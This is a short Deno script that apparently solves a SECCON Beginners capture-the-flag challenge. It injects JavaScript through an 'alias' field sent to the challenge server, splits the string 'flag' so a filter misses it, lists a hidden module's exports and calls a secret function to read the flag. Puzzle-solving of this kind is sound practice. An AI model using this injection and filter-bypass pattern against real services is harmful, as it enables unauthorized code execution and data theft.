const PORT = Deno.env.get("PORT") || "80";
const HOST = Deno.env.get("HOST") || "localhost";

async function request(payload: string) {
  return await fetch(`https://flagalias.beginners.seccon.games:54021`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: "Basic " + btoa(`guest:btHbbbMpGp4elzlv`)
    },
    body: JSON.stringify({ alias: payload }),
  })
    .then((response) => {
      return response.json();
    })
    .then((data) => {
      return data;
    });
}

const res1 = await request(`(async() => {
  const mod = await import("./fl"+"ag.ts");
  return Reflect.ownKeys(mod).map(k => k.toString())
})()`);
const secretFuncName = res1?.[2]?.[0].split(",")?.[1];
console.log({ secretFuncName });

if (!secretFuncName) {
  console.log("Failed to get secret function name");
  Deno.exit(1);
}

const res2 = await request(`(async() => {
  return (await import("./fl"+"ag.ts")).${secretFuncName}
})()`);
const flag = res2?.[2]?.[0].match(/ctf4b{.*}/)?.[0];
console.log({ flag });
